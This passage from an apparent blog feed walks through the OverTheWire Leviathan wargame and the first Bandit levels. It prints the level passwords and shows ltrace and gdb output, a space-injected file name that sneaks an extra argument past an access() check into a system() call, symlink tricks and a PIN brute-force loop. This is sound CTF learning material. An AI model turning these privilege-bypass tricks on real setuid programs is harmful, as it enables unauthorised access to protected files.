&lt;p&gt;Let&amp;rsquo;s take a look in that &lt;code&gt;.backup&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ ls .backup/
bookmarks.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Checking the contents of the file, we see it really is a list of bookmarks.
Going on the assumption that the password for the next level is in there, let&amp;rsquo;s
grep for &lt;em&gt;leviathan&lt;/em&gt; in this file&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ grep leviathan .backup/bookmarks.html 
&amp;lt;DT&amp;gt;&amp;lt;A HREF=&amp;quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&amp;quot; ADD_DATE=&amp;quot;1155384634&amp;quot; LAST_CHARSET=&amp;quot;ISO-8859-1&amp;quot; ID=&amp;quot;rdf:#$2wIU71&amp;quot;&amp;gt;password to leviathan1&amp;lt;/A&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there it is&lt;/p&gt;

&lt;h1 id=&#34;level-1-2:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 1 -&amp;gt; 2&lt;/h1&gt;

&lt;p&gt;As usual we login, do a &lt;code&gt;ls -la&lt;/code&gt; and see a &lt;code&gt;check&lt;/code&gt; binary that is setuid &lt;code&gt;leviathan2&lt;/code&gt;.
Let&amp;rsquo;s run it and see what happens&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ./check 
password: test
Wrong password, Good Bye ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Trying the usual &lt;code&gt;strings check&lt;/code&gt; shows us a couple of interesting strings: &lt;code&gt;secret&lt;/code&gt; and &lt;code&gt;love&lt;/code&gt;.
Neither one or both will return success. Hrmm. Ok, let&amp;rsquo;s take a look at the
disassembly&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass main
Dump of assembler code for function main:
   0x0804852d &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804852e &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x08048530 &amp;lt;+3&amp;gt;:	and    $0xfffffff0,%esp
   0x08048533 &amp;lt;+6&amp;gt;:	sub    $0x30,%esp
   0x08048536 &amp;lt;+9&amp;gt;:	mov    %gs:0x14,%eax
   0x0804853c &amp;lt;+15&amp;gt;:	mov    %eax,0x2c(%esp)
   0x08048540 &amp;lt;+19&amp;gt;:	xor    %eax,%eax
   0x08048542 &amp;lt;+21&amp;gt;:	movl   $0x786573,0x18(%esp)
   0x0804854a &amp;lt;+29&amp;gt;:	movl   $0x72636573,0x25(%esp)
   0x08048552 &amp;lt;+37&amp;gt;:	movw   $0x7465,0x29(%esp)
   0x08048559 &amp;lt;+44&amp;gt;:	movb   $0x0,0x2b(%esp)
   0x0804855e &amp;lt;+49&amp;gt;:	movl   $0x646f67,0x1c(%esp)
   0x08048566 &amp;lt;+57&amp;gt;:	movl   $0x65766f6c,0x20(%esp)
   0x0804856e &amp;lt;+65&amp;gt;:	movb   $0x0,0x24(%esp)
   0x08048573 &amp;lt;+70&amp;gt;:	movl   $0x8048680,(%esp)
   0x0804857a &amp;lt;+77&amp;gt;:	call   0x80483c0 &amp;lt;printf@plt&amp;gt;
   0x0804857f &amp;lt;+82&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x08048584 &amp;lt;+87&amp;gt;:	mov    %al,0x14(%esp)
   0x08048588 &amp;lt;+91&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x0804858d &amp;lt;+96&amp;gt;:	mov    %al,0x15(%esp)
   0x08048591 &amp;lt;+100&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x08048596 &amp;lt;+105&amp;gt;:	mov    %al,0x16(%esp)
   0x0804859a &amp;lt;+109&amp;gt;:	movb   $0x0,0x17(%esp)
   0x0804859f &amp;lt;+114&amp;gt;:	lea    0x18(%esp),%eax
   0x080485a3 &amp;lt;+118&amp;gt;:	mov    %eax,0x4(%esp)
   0x080485a7 &amp;lt;+122&amp;gt;:	lea    0x14(%esp),%eax
   0x080485ab &amp;lt;+126&amp;gt;:	mov    %eax,(%esp)
   0x080485ae &amp;lt;+129&amp;gt;:	call   0x80483b0 &amp;lt;strcmp@plt&amp;gt;
   0x080485b3 &amp;lt;+134&amp;gt;:	test   %eax,%eax
   0x080485b5 &amp;lt;+136&amp;gt;:	jne    0x80485c5 &amp;lt;main+152&amp;gt;
   0x080485b7 &amp;lt;+138&amp;gt;:	movl   $0x804868b,(%esp)
   0x080485be &amp;lt;+145&amp;gt;:	call   0x8048400 &amp;lt;system@plt&amp;gt;
   0x080485c3 &amp;lt;+150&amp;gt;:	jmp    0x80485d1 &amp;lt;main+164&amp;gt;
   0x080485c5 &amp;lt;+152&amp;gt;:	movl   $0x8048693,(%esp)
   0x080485cc &amp;lt;+159&amp;gt;:	call   0x80483f0 &amp;lt;puts@plt&amp;gt;
   0x080485d1 &amp;lt;+164&amp;gt;:	mov    $0x0,%eax
   0x080485d6 &amp;lt;+169&amp;gt;:	mov    0x2c(%esp),%edx
   0x080485da &amp;lt;+173&amp;gt;:	xor    %gs:0x14,%edx
   0x080485e1 &amp;lt;+180&amp;gt;:	je     0x80485e8 &amp;lt;main+187&amp;gt;
   0x080485e3 &amp;lt;+182&amp;gt;:	call   0x80483e0 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x080485e8 &amp;lt;+187&amp;gt;:	leave  
   0x080485e9 &amp;lt;+188&amp;gt;:	ret    
End of assembler dump.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So it uses &lt;code&gt;strcmp&lt;/code&gt; to compare our input to whatever the right pass is (&lt;code&gt;0x080485ae&lt;/code&gt;)
I&amp;rsquo;m going to use &lt;code&gt;ltrace&lt;/code&gt; to trace through the library call and see what that reveals&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ltrace ./check 
__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 &amp;lt;unfinished ...&amp;gt;
printf(&amp;quot;password: &amp;quot;)                                       = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: test
)               = 116
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 101
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 115
strcmp(&amp;quot;tes&amp;quot;, &amp;quot;sex&amp;quot;)                                       = 1
puts(&amp;quot;Wrong password, Good Bye ...&amp;quot;Wrong password, Good Bye ...
)                       = 29
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there we have it.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-2-3:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 2 -&amp;gt; 3&lt;/h1&gt;

&lt;p&gt;This time we are given a file called &lt;code&gt;printfile&lt;/code&gt; that is setuid &lt;code&gt;leviathan3&lt;/code&gt;.
Initially you&amp;rsquo;d think we can just print the contents of the &lt;code&gt;leviathan3&lt;/code&gt; password
file. Nope, there&amp;rsquo;s a check in the binary preventing us from doing so.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s find out what that check is with &lt;code&gt;ltrace&lt;/code&gt; once again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan2@melinda:~$ ltrace ./printfile /tmp/unlogic
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &amp;lt;unfinished ...&amp;gt;
access(&amp;quot;/tmp/unlogic&amp;quot;, 4)                                  = 0
snprintf(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;, 511, &amp;quot;/bin/cat %s&amp;quot;, &amp;quot;/tmp/unlogic&amp;quot;) = 21
system(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;testing
 &amp;lt;no return ...&amp;gt;
--- SIGCHLD (Child exited) ---
&amp;lt;... system resumed&amp;gt; )                                     = 0
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We can see that it checks access to the file, then runs &lt;code&gt;cat&lt;/code&gt; on the file if it&amp;rsquo;s
ok for us to access it. Symlinks won&amp;rsquo;t work here, as the &lt;code&gt;access&lt;/code&gt; call dereferences
the symlink. So what can we do? We exploit spaces. By creating a file that is a symlink to
the &lt;code&gt;leviathan3&lt;/code&gt; password file, along with another file, that has the same name followed
by a space and another name, we can trick &lt;code&gt;access&lt;/code&gt; into allowing it to carry on, and
then &lt;code&gt;cat&lt;/code&gt; to print the files. let me show you&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/levpass3
leviathan2@melinda:~$ touch /tmp/levpass3&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;other
leviathan2@melinda:~$ ./printfile /tmp/levpass3&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;other
Ahdiemoo1j
/bin/cat: other: No such file or directory
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So access checks &lt;code&gt;/tmp/levpass3\ other&lt;/code&gt; and deems it ok. Then that string gets
passed to &lt;code&gt;cat&lt;/code&gt; which interprets it as two files, hence the &lt;code&gt;/bin/cat: other: No such file or directory&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-3-4:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 3 -&amp;gt; 4&lt;/h1&gt;

&lt;p&gt;Another program that prompts for a pass. Usual approaches of &lt;code&gt;strings&lt;/code&gt; and checking
the &lt;em&gt;disass&lt;/em&gt; doesn&amp;rsquo;t reveal much, but the function &lt;code&gt;do_stuff&lt;/code&gt; does call &lt;code&gt;strcmp&lt;/code&gt;
and we know now that we can use &lt;code&gt;ltrace&lt;/code&gt; to help us out&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan3@melinda:~$ ltrace ./level3 
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &amp;lt;unfinished ...&amp;gt;
strcmp(&amp;quot;h0no33&amp;quot;, &amp;quot;kakaka&amp;quot;)                                 = -1
printf(&amp;quot;Enter the password&amp;gt; &amp;quot;)                             = 20
fgets(Enter the password&amp;gt; d
&amp;quot;d\n&amp;quot;, 256, 0xf7fcac20)                              = 0xffffd58c
strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)                               = -1
puts(&amp;quot;bzzzzzzzzap. WRONG&amp;quot;bzzzzzzzzap. WRONG
)                                 = 19
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A little bit of obfuscation here, but to our keen eyes, we see where the test
is happening &lt;code&gt;strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)&lt;/code&gt;. Our password is &lt;code&gt;snlprintf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan3@melinda:~$ ./level3 
Enter the password&amp;gt; snlprintf  
[You&amp;#39;ve got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-4-5:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 4 -&amp;gt; 5&lt;/h1&gt;

&lt;p&gt;Inside the hidden directory (you always run &lt;code&gt;ls -la&lt;/code&gt;, right?) we have a bin file.
It&amp;rsquo;s executable, so let&amp;rsquo;s run it&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan4@melinda:~$ ./.trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m guessing we need to decode that from the current binary encoded string to text. This
gives us &lt;code&gt;Tith4cokei&lt;/code&gt;. Testing it out takes us to&lt;/p&gt;

&lt;h1 id=&#34;level-5-6:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 5 -&amp;gt; 6&lt;/h1&gt;

&lt;p&gt;We have a binary called &lt;code&gt;leviathan5&lt;/code&gt; that is suid &lt;code&gt;leviathan6&lt;/code&gt;. Upon running it,
we get a message that file &lt;code&gt;tmp/file.log&lt;/code&gt; cannot be found. If you create one, it
will open it, print its contents, close it, and then delete it. So let&amp;rsquo;s give the
old symlink method a try:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5 
UgaoFee4li
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result.&lt;/p&gt;

&lt;h1 id=&#34;level-6-7:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 6 -&amp;gt; 7&lt;/h1&gt;

&lt;p&gt;We need a 4 digit pass code to access this. I opted for brute force. For 4 digits
that&amp;rsquo;s by far the simplest and quickest way. After looking at the disassembly, we
see that it will call &lt;code&gt;/bin/sh&lt;/code&gt; and drop us to a shell, so we don&amp;rsquo;t need an exit condition.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan6@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./leviathan6 &lt;span style=&#34;color: #f8f8f2&#34;&gt;$i&lt;/span&gt; &amp;gt; /dev/null&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
0000
0001
.
.
7123
&lt;/pre&gt;&lt;/div&gt;

It stops there. Because we redirect to /dev/null, we need to ctrl+c and then enter
the last printed number to get the password&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan6@melinda:~$ ./leviathan6  7123
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The final flag for level 7 is&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don&#39;t post writeups, solutions or spoilers about the games on the web. Thank you!)  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I understand the reasons, but this is not the only write up out there, and it is a fairly old
wargame too. IMO I feel that providing these walkthroughs will help those who are stuck.
If you are however just following this so that you can complete Leviathan, then you should
sit down and have a go at this, or other war games without a guide. Challenge yourself.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Let&#39;s crack Bandit Part 1</title>
      <link>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1/</link>
      <pubDate>Fri, 13 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1/</guid>
      <description>

&lt;p&gt;Let&amp;rsquo;s give Bandit from the &lt;a href=&#34;http://overthewire.org/wargames&#34;&gt;overthewire war games&lt;/a&gt;
a going over. I did this a while back, but never really wrote it up,
so I&amp;rsquo;m going to do it again and write it up. Remember that you can copy
and paste from all the &lt;a href=&#34;https://asciinema.org&#34;&gt;asciinema&lt;/a&gt; videos below.&lt;/p&gt;

&lt;p&gt;Bandit is a CTF/wargame for beginners and a great intro to various
linux tools as well. I won&amp;rsquo;t repeat the level summary for each post, instead
there&amp;rsquo;s a link to the original page for each section.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;d be interested to know if the asciinema files are preferable over the
plain text format or not. Let me know in the comments below. I&amp;rsquo;ve used
asciinema in the first level only, but would post the asciinema vids if they
are useful.&lt;/p&gt;

&lt;p&gt;&lt;section id=&#34;table-of-contents&#34; class=&#34;toc&#34;&gt;
&lt;header&gt;
&lt;h3&gt;Contents&lt;/h3&gt;
&lt;/header&gt;
&lt;div id=&#34;drawer&#34; markdown=&#34;1&#34;&gt;
*  Auto generated table of contents
{:toc}
&lt;/div&gt;
&lt;/section&gt;&lt;!-- /#table-of-contents --&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-0-1:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 0 -&amp;gt; 1&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit1.html&#34;&gt;level 00&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not much to do here but login and read a file so:&lt;/p&gt;

&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/17664.js&#34; id=&#34;asciicast-17664&#34; async&gt;&lt;/script&gt;

&lt;h1 id=&#34;level-1-2:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 1 -&amp;gt; 2&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit2.html&#34;&gt;level 01&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using the password from the last session, let&amp;rsquo;s login and look at what&amp;rsquo;s in
&lt;code&gt;-&lt;/code&gt;. The trick here is that &lt;code&gt;-&lt;/code&gt; is a bit tricky to pass as an argument. Try
it to see what happens. All we need to do it prefix it with the path:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit1@melinda:~$ ls -la
total 24
-rw-r-----   1 bandit2 bandit1   33 Jun  6  2013 -
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
bandit1@melinda:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-2-3:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 2 -&amp;gt; 3&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit3.html&#34;&gt;level 02&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not much trickiness here, merely the spaces in the filename. But with TAB
completion the escaping of the spaces will be handled for us:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit2@melinda:~$ ls -la
total 24
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
-rw-r-----   1 bandit3 bandit2   33 Jun  6  2013 spaces in this filename
bandit2@melinda:~$ cat ./spaces&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;in&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;this&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-3-4:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 3 -&amp;gt; 4&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit4.html&#34;&gt;level 03&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hidden file? Just do a long listing with &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit3@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root 4096 Jun  6  2013 .
drwxr-xr-x 160 root root 4096 Oct 17  2013 ..
-rw-r--r--   1 root root  220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root root 3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root root  675 Apr  3  2012 .profile
drwxr-xr-x   2 root root 4096 Jun  6  2013 inhere
bandit3@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;inhere/
bandit3@melinda:~/inhere$ ls
bandit3@melinda:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 3 root    root    4096 Jun  6  2013 ..
-rw-r----- 1 bandit4 bandit3   33 Jun  6  2013 .hidden
bandit3@melinda:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-4-5:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 4 -&amp;gt; 5&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit5.html&#34;&gt;level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We need to find a human readable file in the &lt;code&gt;inhere&lt;/code&gt; directory. Using the
power of bash:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit4@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;inhere/
bandit4@melinda:~/inhere$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; f in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;ls&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; file ./&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
bandit4@melinda:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Change into the &lt;code&gt;inhere&lt;/code&gt; directory and then for each file returned by the &lt;code&gt;ls&lt;/code&gt;
command, get the filetype with the &lt;code&gt;file&lt;/code&gt; command. Only one which is ASCII, so
that&amp;rsquo;s a good candidate. Sure enough, it&amp;rsquo;s the one we are after.&lt;/p&gt;

&lt;h1 id=&#34;level-5-6:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 5 -&amp;gt; 6&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit6.html&#34;&gt;level 05&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is similar to the previous level, except now we are looking for something
with a specific size. Luckily the &lt;code&gt;find&lt;/code&gt; command is just right for this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit5@melinda:~$ find ./ -size 1033c
./inhere/maybehere07/.file2
bandit5@melinda:~$ file ./inhere/maybehere07/.file2
./inhere/maybehere07/.file2: ASCII text, with very long lines
bandit5@melinda:~$ cat !&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;$&lt;/span&gt;
cat ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-6-7:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 6 -&amp;gt; 7&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit7.html&#34;&gt;level 06&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we need to broaden our search. Once again &lt;code&gt;find&lt;/code&gt; to the rescue. We know
the user and group that own the file and its size. The user and group might
be enough already, so let&amp;rsquo;s give that a go&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit6@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
bandit6@melinda:/$ find -user bandit7 -group bandit6  2&amp;gt; /dev/null 
./var/lib/dpkg/info/bandit7.password
bandit6@melinda:/$ cat ./var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect. I piped the &lt;code&gt;stderr&lt;/code&gt; to &lt;code&gt;/dev/null&lt;/code&gt; so it doesn&amp;rsquo;t clutter the output
with files that it can&amp;rsquo;t read.&lt;/p&gt;

&lt;h1 id=&#34;level-7-8:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 7 -&amp;gt; 8&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit8.html&#34;&gt;Level 07&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To find things in a file, &lt;code&gt;grep&lt;/code&gt; is usually the answer. However it&amp;rsquo;s probably
wise to check the file format first in case all the words are smushed together
and we need to filter grep again.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit7@melinda:~$ head data.txt 
Kunming&amp;#39;s	0D0KZ3TdLRBXD8lyd7Bj2hAqnxaMInQe
multitude&amp;#39;s	8MFZa8yOjTt6m8PvxteTp7XTDFLiuFAk
audibility	ZeLj0yAw7ylmEoLxSUEqF4iB43c9DN4h
unadvised	Pgp8X2LSVdNrmIKcJ7Oe8eqTzEVfhGbR
Brecht&amp;#39;s	uKyKryNUZYFuTQpwRlDqucLLIUbiIMF0
Alvin	IpQIV6mpjticdB790obqXAvYkAgnDV8E
insufficient	cgHhWVJahfDqFIe82vOliryQQ8ihGlGN
Sauterne	UhPBp0A04GkIRfvZnUt1UdwlKU2ViYUd
cluster	1GeFZ0B6rsEtJ5Sqb5h8Wv7UwG15DQzb
ember&amp;#39;s	f2XPIE1iDHW9oHPyodPyfTz87DAbWmXu
bandit7@melinda:~$ grep millionth data.txt 
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Luckily it was one word and password per line, so grepping the file worked
fine.&lt;/p&gt;

&lt;h1 id=&#34;level-8-9:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 8 -&amp;gt; 9&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit9.html&#34;&gt;level 08&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So the only way we know which entry is the password is that it occurs
only once. For this the linux tool &lt;code&gt;uniq&lt;/code&gt; seems perfect. However it can
only detect duplicate lines if they are next to each other. To fix this
we also need to sort the contents of the file and then display only
unique lines:&lt;/p&gt;

